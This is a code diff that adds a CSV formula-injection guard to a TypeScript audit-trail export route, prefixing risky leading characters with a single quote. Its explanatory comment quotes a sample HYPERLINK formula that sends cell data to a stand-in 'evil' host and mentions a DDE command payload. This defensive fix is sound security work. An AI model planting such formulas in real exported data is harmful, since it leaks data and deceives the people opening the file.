@@ -434,7 +434,24 @@ export async function readRoutes(app: FastifyInstance): Promise<void> {
       reply.header("Content-Disposition", `attachment; filename="${fname}"`);
       const escape = (v: unknown): string => {
         if (v === null || v === undefined) return "";
-        const s = typeof v === "string" ? v : JSON.stringify(v);
+        let s = typeof v === "string" ? v : JSON.stringify(v);
+        // R77 F1 (HIGH): CSV formula-injection guard. Excel /
+        // Google Sheets / Numbers interpret any cell whose first
+        // char is `=`, `+`, `-`, `@`, TAB or CR as a formula. A
+        // tenant admin who names a webhook / API key / display
+        // name `=HYPERLINK("http://evil/"&A2,"Sign here")`
+        // (or a `+cmd|` DDE payload on older Excel) plants a
+        // formula that fires when the auditor / customer ops
+        // opens the exported audit trail — OWASP CSV Injection.
+        // Prior shape only quoted RFC 4180 metacharacters
+        // (`"`, `,`, `\n`, `\r`), so leading `=` / `+` / `-` /
+        // `@` / TAB rode through unescaped. Prefix a `'` so the
+        // cell is rendered as literal text; every major
+        // spreadsheet honours the single-quote leader as a text
+        // sigil. Applies to every string-valued export column.
+        if (/^[=+\-@\t\r]/.test(s)) {
+          s = "'" + s;
+        }
         // RFC 4180: any field containing " , or newline must be quoted;
         // embedded quotes are doubled.
         if (/[",\n\r]/.test(s)) return '"' + s.replace(/"/g, '""') + '"';
